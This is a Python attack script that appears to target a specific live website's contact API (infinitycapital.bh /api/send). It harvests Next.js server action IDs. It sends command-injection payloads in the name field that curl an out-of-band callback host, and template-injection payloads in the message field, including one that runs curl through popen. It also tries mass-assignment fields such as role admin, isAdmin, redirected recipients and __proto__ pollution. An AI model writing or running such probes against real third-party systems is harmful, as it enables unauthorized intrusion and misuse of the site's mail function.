import requests, json, time
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
B='https://www.infinitycapital.bh'
s=requests.Session(); s.headers.update({'User-Agent':UA})
CM='oobad8fa46690e0.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in'
SS='oob026cd244fe4f.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in'
def post(field, val, extra=None):
    d={'name':'IC Probe','email':'probe@invalid.example','subject':'probe','message':'probe','targets':'nope@invalid.example'}
    d[field]=val
    if extra: d.update(extra)
    t=time.time()
    r=s.post(B+'/api/send', json=d, timeout=40)
    return r, time.time()-t
print("== RSC / server action discovery ==",flush=True)
r=s.get(B+'/',headers={'RSC':'1'},timeout=30)
print("RSC:1 ->",r.status_code,len(r.content),r.headers.get('x-matched-path'),flush=True)
body=r.content.decode('utf-8','replace')
open('p16_home.rsc','w').write(body)
import re
print("action ids:",set(re.findall(r'"([0-9a-f]{40,})"',body)),flush=True)
print("has __next_f:", '__next_f' in body, " has ACTION:", 'action' in body.lower(), flush=True)

print("\n== cmdi OOB via name ==",flush=True)
for v in [f";curl http://{CM}/cmdi; ", f"$(curl http://{CM}/cmdi)", f"`curl http://{CM}/cmdi`", f"|curl http://{CM}/cmdi", f";curl http://{CM}/cmdi"]:
    r,el=post('name', v); print(f"  {r.status_code} {el:.1f}s :: {r.content[:120]!r} :: {v[:45]}",flush=True); time.sleep(1)

print("\n== ssti OOB via message ==",flush=True)
for v in [f"${{7*7}}", "{{7*7}}", "#{7*7}", f"${{'x'.popen('curl http://{SS}/ssti').read()}}", f"{{{{constructor.constructor('return 1')()}}}}", f"<%= 7*7 %>", f"${{T(java.lang.Runtime).getRuntime()}}"]:
    r,el=post('message', v); print(f"  {r.status_code} {el:.1f}s :: {r.content[:150]!r} :: {v[:55]}",flush=True); time.sleep(1)

print("\n== mass assignment / extra fields ==",flush=True)
for extra in [{'role':'admin'},{'isAdmin':True},{'to':'attacker@invalid.example'},{'targets':'a@invalid.example,b@invalid.example'},{'apiKey':'x'},{'__proto__':{'admin':True}}]:
    r,el=post('name','IC Probe',extra); print(f"  {r.status_code} :: {r.content[:160]!r} :: {extra}",flush=True); time.sleep(1)
